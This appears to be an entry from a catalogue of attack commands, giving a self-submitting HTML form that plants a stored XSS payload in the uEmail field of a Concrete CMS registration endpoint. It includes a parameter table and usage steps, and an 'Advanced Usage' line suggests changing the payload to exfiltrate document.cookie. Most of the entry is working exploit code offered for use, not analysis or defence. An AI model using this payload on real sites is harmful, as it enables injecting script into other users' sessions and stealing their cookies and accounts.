---
data: >-
  <html>

  <body>

  <form method="POST"
  action="http://[host]/concrete5/index.php/register/do_register">

  <input type="hidden" name="uName" value="StoredXSS">

  <input type="hidden" name="uEmail"
  value='stored@xss.com"><script>alert(/XSS/)</script>'>

  <input type="hidden" name="uPassword" value="password">

  <input type="hidden" name="uPasswordConfirm" value="password">

  <input type="hidden" name="uDefaultLanguage" value="it-IT">

  </form>

  <script>document.forms[0].submit()</script>

  </body>

  </html>
tags:
  - xss
  - exploit
type: command
output: null
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.393Z'
id: af3a0fa5-da35-4866-bee9-82e39e1181ae
verified: false
validated: true
submitted: true
---
# register-user-with-xss-in-uemail

## Command

```html
<html>
<body>
<form method="POST" action="http://[host]/concrete5/index.php/register/do_register">
<input type="hidden" name="uName" value="StoredXSS">
<input type="hidden" name="uEmail" value='stored@xss.com"><script>alert(/XSS/)</script>'>
<input type="hidden" name="uPassword" value="password">
<input type="hidden" name="uPasswordConfirm" value="password">
<input type="hidden" name="uDefaultLanguage" value="it-IT">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

## Description

This HTML command auto-submits a registration form to exploit stored XSS in the uEmail field of Concrete CMS, injecting a script that executes on profile views.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| uEmail | Malicious email payload to breakout and inject script | Yes |
| uName | Username for the account | Yes |
| uPassword | Password for registration | Yes |
| action URL | Target registration endpoint | Yes |

## Examples

### Basic Usage

Save as HTML and open in browser targeting the host.

### Advanced Usage

Modify payload for custom JS, e.g., document.cookie exfiltration.

## Expected Output

User registered successfully; no immediate alert, but triggers on profile access with alert(/XSS/).

## Related

- [[Related Procedure]]
